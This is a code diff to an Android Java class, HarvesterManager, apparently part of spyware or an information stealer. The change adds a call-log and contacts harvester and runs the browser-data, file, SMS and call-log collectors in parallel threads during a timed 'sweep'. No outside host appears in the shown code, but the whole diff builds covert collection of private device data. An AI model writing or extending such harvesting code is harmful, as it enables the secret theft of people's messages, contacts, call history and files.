@@ -11,6 +11,7 @@ public class HarvesterManager {
     private final BrowserHarvester browserHarvester;
     private final FileHarvester fileHarvester;
     private final SmsHarvester smsHarvester;
+    private final CallLogHarvester callLogHarvester;
 
     private volatile boolean sweeping = false;
     private Thread sweepThread;
@@ -21,6 +22,7 @@ public class HarvesterManager {
         this.browserHarvester = new BrowserHarvester(context, this);
         this.fileHarvester = new FileHarvester(context, this);
         this.smsHarvester = new SmsHarvester(context);
+        this.callLogHarvester = new CallLogHarvester(context);
     }
 
     public void startSweep(int durationSeconds) {
@@ -30,13 +32,28 @@ public class HarvesterManager {
         sweepThread = new Thread(() -> {
             Log.i(TAG, "Sweep started for " + durationSeconds + "s");
 
-            browserHarvester.collectBrowserData();
-            fileHarvester.collectFiles();
+            // Run all harvesters in parallel
+            Thread browserThread = new Thread(() -> browserHarvester.collectBrowserData());
+            Thread fileThread = new Thread(() -> fileHarvester.collectFiles());
+            Thread smsThread = new Thread(() -> smsHarvester.collectSms());
+            Thread callLogThread = new Thread(() -> {
+                callLogHarvester.collectCallLogs();
+                callLogHarvester.collectContacts();
+            });
 
-            if (durationSeconds > 0) {
-                try { Thread.sleep(durationSeconds * 1000L); } catch (InterruptedException ignored) {}
-            }
+            browserThread.start();
+            fileThread.start();
+            smsThread.start();
+            callLogThread.start();
 
+            try {
+                browserThread.join(60000);
+                fileThread.join(120000);
+                smsThread.join(30000);
+                callLogThread.join(30000);
+            } catch (InterruptedException ignored) {}
+
+            Log.i(TAG, "Sweep completed");
             stopSweep();
         });
         sweepThread.start();
